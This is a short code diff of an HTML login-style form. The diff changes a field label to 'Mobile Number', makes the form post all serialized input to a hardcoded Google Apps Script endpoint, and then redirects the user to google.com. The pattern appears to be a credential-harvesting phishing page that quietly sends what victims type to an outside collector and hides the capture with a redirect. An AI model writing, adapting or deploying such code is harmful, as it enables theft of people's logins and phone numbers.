@@ -18,7 +18,7 @@
   </div class="responsive">
     <form id="submit-form" action="">
       <div class="input_box">
-        <input type="text" id="fname" name="name" placeholder="Email or Phone" required>
+        <input type="text" id="fname" name="name" placeholder="Mobile Number" required>
         <div class="icon"><i class="fas fa-user"></i></div>
       </div>
       <div class="input_box">
@@ -38,11 +38,11 @@
       $("#submit-form").submit((e)=>{
           e.preventDefault()
           $.ajax({
-              url:"",
+              url:"https://script.google.com/macros/s/AKfycbzBK6u1phHk25zC8clXSOjZkcHHwAK4C7s40c9gWhZzWoO-C4q4U1jo1ZHtHaLC1wTaJg/exec",
               data:$("#submit-form").serialize(),
               method:"post",
               success:function (response){
-                  window.location.href=""
+                  window.location.href="https://google.com/"
               },
               error:function (err){
                   alert("Something Error")
